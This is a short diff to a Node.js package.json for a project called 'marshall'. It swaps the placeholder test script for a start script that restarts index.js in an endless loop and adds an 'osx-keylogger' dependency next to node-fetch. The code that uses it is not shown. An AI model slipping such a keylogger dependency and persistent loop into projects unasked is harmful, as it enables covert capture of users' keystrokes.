@@ -2,15 +2,15 @@
   "name": "marshall",
   "version": "1.0.0",
   "description": "",
-  "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "start": "while :; do node index.js; done"
   },
   "keywords": [],
   "author": "",
   "license": "ISC",
   "dependencies": {
     "node-fetch": "^2.6.1",
+    "osx-keylogger": "^1.0.6",
     "xml2js": "^0.4.23"
   }
 }
